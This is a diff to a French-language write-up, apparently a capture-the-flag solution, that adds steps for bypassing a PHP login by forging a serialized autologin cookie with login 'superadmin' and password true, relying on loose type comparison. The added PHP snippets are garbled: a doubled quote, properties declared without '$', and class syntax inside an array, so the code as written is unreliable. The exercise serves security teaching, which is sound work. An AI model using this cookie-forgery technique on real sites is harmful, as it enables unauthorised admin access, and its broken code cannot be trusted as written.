@@ -35,6 +35,11 @@ Les conditions :
 
 *On se rappel que `TRUE` + une chaine (string) = `true`, et qu'un hash sha256 commençant par `0e` vaut `NULL` :) ;)
 
+$autologin = [
+    "login" => "superadmin",
+    ""password" => true
+]
+
 Mais la condition qui nous renvoie vers la page admin est :
 ```php
 if($_SESSION['login'] === "superadmin")
@@ -45,6 +50,30 @@ Donc on doit affecter "superadmin" à $_SESSION['login'] une fois la vérificati
 ```php
 $_SESSION['login'] = $data['login'];
 ```
+
+```php
+class auth {
+    public login = "superadmin";
+    public password = true;
+}
+
+```
+# <a id="correct"> Correction
+
+On se connection en guest password guest,
+On récupère le cookie autoloading et on url decode
+On créer un cookie avec l'architecture de l'autoloading récupérer 
+
+```php
+$cookie = [
+    public $login = "superadmin";
+    public $password = true;
+];
+$cookie_ser = serialize(new auth);
+
+```
+URL Encode de $cookie_ser.
+On passe l'encodage dans le cookie et on refresh !
 
 
 ```php
